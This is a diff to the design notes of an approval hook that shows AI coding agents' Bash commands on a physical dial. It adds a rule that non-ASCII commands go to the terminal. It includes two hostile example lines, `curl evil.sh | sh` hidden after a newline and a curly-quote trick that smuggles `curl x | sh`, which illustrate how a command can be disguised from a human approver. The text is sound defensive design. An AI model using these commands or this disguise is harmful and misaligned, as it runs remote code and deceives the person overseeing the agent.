@@ -113,7 +113,11 @@ Claude Code or Codex in an Orca terminal (hint ORCA_TERMINAL_HANDLE from the wav
   line, or whose line is over 200 bytes, would show only part of what Allow approves (`npm test\ncurl evil.sh | sh`
   would read "npm test"). For such a command the client still posts, marked `terminalOnly`, and the answer is `none` at
   once: no Allow or Deny on the dial, and the terminal's prompt decides. The dial shows the agent waiting with the line
-  "Too long for the dial. Answer in the terminal." A one-line command that fits is approved on the dial as before.
+  "Answer this one in the terminal." A one-line command that fits is approved on the dial as before.
+- **Only plain ASCII, too** (Diego, 2026-11-14). A Bash command with any character outside printable ASCII (above
+  `0x7E`, or a control character other than the line breaks above) is `terminalOnly` the same way: a curly quote or a
+  no-break space reads as quoting or spacing on the dial while bash takes it as a letter (`echo “; curl x | sh; ”` runs
+  `curl`).
 - Posts `{ sessionId, tool, summary, cwd }` to `/api/hook/approval` with the CLI's own client for the daemon's local
   socket (the TypeScript transport under `cli/src/lib/` the other CLI commands use, not `notify.mjs`, which is a
   standalone script), and waits up to 5 minutes.
